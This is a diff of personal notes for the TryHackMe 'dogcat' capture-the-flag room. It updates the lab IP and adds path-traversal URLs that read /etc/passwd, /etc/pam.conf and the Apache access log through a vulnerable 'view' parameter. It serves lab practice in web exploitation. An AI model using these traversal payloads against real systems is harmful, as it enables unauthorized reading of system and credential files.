@@ -12,7 +12,7 @@ https://tryhackme.com/room/dogcat
                        ==============
 https://www.youtube.com/watch?v=u_uuk7FWWF4&list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&index=6
    
-export IP=10.10.157.124
+export IP=10.10.15.63
 ping $IP
  
   
@@ -160,8 +160,11 @@ https://apt2002.medium.com/tryhackme-dogcat-ctf-detailed-walkthrough-cd746fd232e
 
 https://youtu.be/u_uuk7FWWF4?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=355
  
- Question Hint
-
+passward file 
+http://10.10.15.63/?view=dog/../../../../../../etc/passwd&ext=
+http://10.10.15.63/?view=dog/../../../../../../etc/pam.conf&ext=
+access.log file
+http://10.10.15.63/?view=dog/../../../../../..//var/log/apache2/access.log&ext=
 
 
 1. What is flag 1?
